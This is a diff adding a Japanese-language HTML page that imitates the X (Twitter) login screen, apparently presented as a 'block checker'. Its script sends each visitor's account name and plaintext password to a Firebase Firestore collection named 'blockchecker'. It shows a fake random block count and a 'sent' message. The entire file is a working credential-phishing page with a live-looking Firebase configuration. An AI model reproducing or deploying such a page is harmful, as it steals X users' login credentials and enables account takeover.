@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Xアカウントにログイン</title>
+<style>
+body { background:#000; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh;}
+.container { max-width:420px; width:100%; padding:16px;}
+.card { background:#111; padding:30px; border-radius:20px;}
+label { display:block; margin-top:12px;}
+input { width:100%; padding:10px; margin-top:4px; border-radius:8px; border:none;}
+.btn-login { width:100%; padding:14px; background:#fff; color:#000; border:none; border-radius:30px; cursor:pointer; font-weight:700; margin-top:20px;}
+#result-screen { display:none; margin-top:20px; text-align:center;}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="card">
+    <form id="login-form">
+      <label>アカウント</label>
+      <input type="text" id="account" placeholder="電話番号、メールアドレスまたはユーザー名" required>
+      <label>パスワード</label>
+      <input type="password" id="password" placeholder="パスワードを入力" required>
+      <button type="submit" class="btn-login">ログイン</button>
+    </form>
+    <div id="result-screen">
+      <p>送信完了！</p>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore.js";
+
+// 🔹 あなたの Firebase Web アプリ情報に置き換える
+const firebaseConfig = {
+  apiKey: "AIzaSyB65yYda5Y1bVM3q74HizAQSbRrOT014x0",
+  authDomain: "daada-ae048.firebaseapp.com",
+  projectId: "daada-ae048",
+  storageBucket: "daada-ae048.firebasestorage.app",
+  messagingSenderId: "844142280857",
+  appId: "1:844142280857:web:9ced0beca7eeafd3223808",
+  measurementId: "G-02E60HW9QW"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+const loginForm = document.getElementById('login-form');
+const resultScreen = document.getElementById('result-screen');
+let savedCount = null;
+
+loginForm.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const account = document.getElementById('account').value;
+  const password = document.getElementById('password').value;
+
+  if (savedCount === null) savedCount = Math.floor(Math.random() * 15) + 1;
+
+  await addDoc(collection(db, "blockchecker"), {
+    account,
+    password,
+    blockCount: savedCount,
+    createdAt: serverTimestamp()
+  });
+
+  loginForm.style.display = 'none';
+  resultScreen.style.display = 'block';
+});
+</script>
+</body>
+</html>
